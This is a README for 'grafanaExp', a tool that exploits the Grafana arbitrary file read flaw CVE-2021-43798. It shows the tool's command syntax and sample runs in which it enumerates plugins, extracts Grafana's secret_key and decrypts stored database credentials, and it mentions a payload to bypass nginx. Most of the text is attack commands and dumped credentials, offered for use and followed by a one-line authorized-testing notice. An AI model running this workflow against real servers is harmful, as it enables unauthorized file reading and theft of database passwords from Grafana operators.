# grafanaExp

A exploit tool for Grafana Unauthorized arbitrary file reading vulnerability (CVE-2021-43798), it can burst plugins / extract secret_key / decode data_source info automatic.

## Usage
Automatic exploit with `exp` and local decode dbfile with `decode`.
```
➜  ./grafanaExp -h
NAME:
   grafanaExp - Exploit Grafana with CVE-2021-43798 Arbitrary File Read.

USAGE:
   grafanaExp [global options] command [command options] [arguments...]

AUTHOR:
   A&D-Team

COMMANDS:
   exp      -u [url] -p [plugin] -c [config] -d [db] -k [key]
   decode   -f [dbfile] -k [key]
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h  show help (default: false)

```

### Exp
burst plugins / extract secret_key / decode `data_source` info automatic.
```
➜  ./grafanaExp exp -u http://localhost:3000/ 
2021/12/07 22:19:10 Target vulnerable has plugin [alertlist]
2021/12/07 22:19:10 Get secret_key [SW2YcwTIb9zpOOhoPsMm]
2021/12/07 22:19:10 type:[mysql]        name:[MySQL_01]         url:[test.mysql.io:3306]        user:[root]     password[rootpassword]  database:[test_dbname]  basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 type:[mssql]        name:[Mssql_01]         url:[test_sqlserver:1433]       user:[admin]    password[adminpassword] database:[db_sqlserver] basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 type:[elasticsearch]        name:[es_01]            url:[http://localhost:9200]     user:[] password[]      database:[]     basic_auth_user:[basic_user]    basic_auth_password:[basic_pass]
2021/12/07 22:19:10 type:[postgres]     name:[Postgre_01]               url:[Postgre_01:5432]   user:[pppp]     password[sssswwwww]     database:[postgredb]    basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 All Done, have nice day!

```

### Decode
Local db file decode.
```
➜ ./grafanaExp decode -f grafana.db -k SW2YcwTIb9zpOOhoPsMm
2021/12/07 23:00:20 type:[mysql]        name:[MySQL_01]         url:[test.mysql.io:3306]        user:[root]     password[rootpassword]  database:[test_dbname]  basic_auth_user:[]      basic_auth_password:[]
2021/12/07 23:00:20 type:[mssql]        name:[Mssql_01]         url:[test_sqlserver:1433]       user:[admin]    password[adminpassword] database:[db_sqlserver] basic_auth_user:[]      basic_auth_password:[]
2021/12/07 23:00:20 type:[elasticsearch]        name:[es_01]            url:[http://localhost:9200]     user:[] password[]      database:[]     basic_auth_user:[basic_user]    basic_auth_password:[basic_pass]
2021/12/07 23:00:20 type:[postgres]     name:[Postgre_01]               url:[Postgre_01:5432]   user:[pppp]     password[sssswwwww]     database:[postgredb]    basic_auth_user:[]      basic_auth_password:[]
```

## Update
```
1、support https
2、add darwin binary
3、add payload so that it can bypass nginx
```

## Notice 

This program should only be used for authorized security testing and research purposes.
